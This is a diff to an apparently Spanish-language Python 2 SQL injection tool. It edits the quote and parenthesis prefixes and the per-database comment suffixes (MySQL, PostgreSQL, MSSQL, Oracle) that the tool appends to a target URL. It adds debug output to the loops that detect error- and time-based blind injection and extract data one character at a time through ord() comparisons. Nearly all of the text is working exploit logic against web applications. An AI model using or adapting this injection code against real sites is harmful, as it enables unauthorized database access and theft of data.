@@ -34,8 +34,8 @@ class Injection:
 	manejador = ""
 	sufijos = ['#','/*','//','-- a',';','-- -+']
 	#prefijos = ["'","';",'//','-- a',';']
-	Prefijos = [" ",
-				"'","''", #Simple Quotes
+	Prefijos = [
+				"'",#"''", #Simple Quotes
 				"')","'))","')))", #Simple Quotes with Parentheses
 				'"','""',
 				'")','"))','")))',
@@ -49,7 +49,7 @@ class Injection:
 		#'MySQL':[' ','#','-- -a'," and '%'='"],
 		'Generic':['--','-- -+',""],
 		'mysql':['#','-- -+',""],
-		'pgsql':[';/*',';--',""],
+		'pgsql':['-- -a',""],
 		'mssql':['-- -+',""],
 		'oracle':['from dual;',""]
 	}
@@ -237,15 +237,20 @@ class Injection:
 					for pref in obj.Prefijos:
 						for suf in obj.Sufijos[manejadores]:
 							#obj.prefSuf(obj,tipo)
-							#print "prefijo:"+obj.pref
-							#print "sufijo:"+obj.suf
+							print manejadores
+							print "prefijo:"+pref
+							print "sufijo:"+suf
 							consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 							consulta2 = requests.get(url=obj.server+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+
+							print obj.server+pref+querys+suf
 							if consulta.text == consulta2.text:
 								obj.pref = pref
 								obj.suf = suf
 								obj.manejador = manejadores
-								print "!"+suf + pref+"!"
+								print "!"+pref +" _______"+ suf+"!"
+								print "consulta:"+consulta.content
+								print "consulta2:"+consulta2.content
 								return
 		elif obj.based == "time":
 			for manejadores in obj.PayloadsAttemptTime.keys():
@@ -253,15 +258,15 @@ class Injection:
 					for pref in obj.Prefijos:
 						for suf in obj.Sufijos[manejadores]:
 							#obj.prefSuf(obj,tipo)
-							#print "prefijo:"+obj.pref
-							#print "sufijo:"+obj.suf
+							print "prefijo:"+pref
+							print "sufijo:"+suf
 							consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 							consulta2 = requests.get(url=obj.server+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 							if consulta.text == consulta2.text and consulta2.elapsed.total_seconds() > 2:
 								obj.pref = pref
 								obj.suf = suf
 								obj.manejador = manejadores
-								print "!"+suf + pref+"!"
+								print "!"+pref + suf+"!"
 								return
 
 
@@ -371,6 +376,8 @@ class Injection:
 		# 	return ""
 		if based == "error":
 			consulta = requests.get(url=direccion+"="+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+			if tipo == "version":
+				print direccion+"="+str(ord(caracter))+obj.suf
 			if consulta.text == ok:
 				return caracter
 			elif (consulta.text != ok) and (up == down ):
@@ -379,6 +386,8 @@ class Injection:
 				
 
 				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+				if tipo == "version":
+					print direccion+"="+str(ord(caracter))+obj.suf
 				#consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 
 					
